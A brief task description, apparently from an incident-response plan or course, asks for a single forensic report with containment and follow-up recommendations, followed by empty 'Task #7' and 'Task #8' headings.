Description: Consolidate forensic findings, hash lists, log excerpts, and timeline visualizations into a single report. Highlight any malicious artifacts, persistence mechanisms, or lateral activity. Provide actionable recommendations for containment, eradication, and post‑incident follow‑up.

Task #7

Task #8
